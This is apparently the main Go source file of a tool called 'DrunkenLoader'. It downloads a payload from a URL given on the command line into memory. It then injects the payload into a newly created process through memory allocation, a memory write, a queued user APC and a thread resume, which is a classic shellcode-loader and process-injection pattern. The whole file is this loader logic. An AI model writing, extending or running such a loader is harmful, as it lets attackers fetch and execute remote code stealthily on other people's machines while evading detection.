package main

import (
	"DrunkenLoader/utils"
	"context"
	"fmt"
	"time"
)

const (
	DefaultName = "AuthorDrunkenGod"
)

type MemData = utils.MemData

// NewMemData creates a new instance of MemData.
func NewMemData() *MemData {
	return &MemData{
		Name: DefaultName,
	}
}

func main() {
	utils.RunApp()
	memData := NewMemData()
	cmdArgs := utils.ParseFlags()
	if cmdArgs.URL != "" {
		ctx, cancel := context.WithTimeout(context.Background(), time.Minute*5)
		defer cancel()
		err := memData.DownloadFileFromServer(ctx, cmdArgs.URL)
		utils.HandleError("Download failed", err)

		// Continue processing memData...
		fmt.Printf("Downloaded file '%s' with size %d bytes.\n", memData.Name, memData.Size)
		spawnProc := &utils.SpawnInfo{MemData: memData}
		spawnProc.CreateApp()
		//spawnProc.CreateProcA()
		spawnProc.AllocateMem()
		spawnProc.WriteMem()
		spawnProc.CreateUserApc()
		spawnProc.ResumeThread()
	}
}
